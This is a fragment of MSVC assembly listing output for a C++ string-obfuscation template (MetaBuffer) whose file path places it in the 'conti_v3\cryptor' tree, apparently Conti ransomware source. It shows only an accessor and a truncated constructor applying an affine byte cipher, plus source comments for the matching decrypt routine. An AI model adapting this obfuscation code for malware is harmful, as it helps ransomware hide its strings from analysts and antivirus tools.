;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv280 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
